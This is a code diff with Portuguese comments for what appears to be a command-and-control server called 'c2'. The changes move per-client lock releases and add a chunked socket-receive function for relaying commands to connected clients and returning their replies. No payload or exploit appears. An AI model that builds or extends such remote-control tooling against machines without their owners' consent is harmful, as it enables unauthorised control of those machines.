@@ -67,14 +67,10 @@ def cliente_online(index: int):
     try:
         resposta = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
     except:
-        clientes[index][1].release()
         print(f"Cliente {clientes[index][0][1]} desconectado!")
         clientes[index][0][0].close()
         clientes.pop(index)
         return index
-
-    # Destravando as transmissões do cliente
-    clientes[index][1].release()
 
     # Se o tamanho da resposta do cliente for menor que 1, finaliza-se
     # o socket do cliente, remove-se o mesmo da lista de clientes e
@@ -84,6 +80,9 @@ def cliente_online(index: int):
         clientes[index][0][0].close()
         clientes.pop(index)
         return index
+
+    # Destravando as transmissões do cliente
+    clientes[index][1].release()
 
     # Se a resposta do "ping" estiver incorreta, destrava-se as
     # transmissões para o cliente e retorna-se o índice
@@ -180,6 +179,26 @@ def informar_desconectado(index: int, retorno: dict):
     clientes.pop(index)
 
     return
+
+# Função para receber dados de um cliente
+def receber_dados(index):
+    # Recebendo dados até que o buffer recebido seja menor que o
+    # tamanho máximo de buffer
+    retorno = ''
+    try:
+        dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+    except:
+        raise Exception()
+    retorno += dados
+
+    while (not len(dados) < TAMANHO_BUFFER):
+        try:
+            dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+        except:
+            raise Exception()
+        retorno += dados
+
+    return retorno
 
 def main():
     # Armazenando, globalmente, variável de continuidade da execução
@@ -302,7 +321,6 @@ Digite `./c2 -l` para obter a lista de IDs disponíveis"""
         try:
             clientes[index][0][0].send(message_text.encode(CHARSET))
         except:
-            clientes[index][1].release()
             informar_desconectado(index, retorno)
             continue
 
@@ -310,14 +328,10 @@ Digite `./c2 -l` para obter a lista de IDs disponíveis"""
         # destrava-se as transmissões para o mesmo e informa-se desconexão
         # do mesmo
         try:
-            retorno["text"] = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+            retorno["text"] = receber_dados(index)
         except:
-            clientes[index][1].release()
             informar_desconectado(index, retorno)
             continue
-
-        # Destravando as transmissões do cliente
-        clientes[index][1].release()
 
         # Se o tamanho da resposta for menor que 1, informa-se desconexão
         # do cliente
@@ -325,7 +339,9 @@ Digite `./c2 -l` para obter a lista de IDs disponíveis"""
             informar_desconectado(index, retorno)
             continue
 
-        # Respondendo mensagem com resposta do cliente
+        # Destravando as transmissões do cliente e respondendo mensagem
+        # com resposta do cliente
+        clientes[index][1].release()
         requisicoes.responder_mensagem(retorno)
 
     return
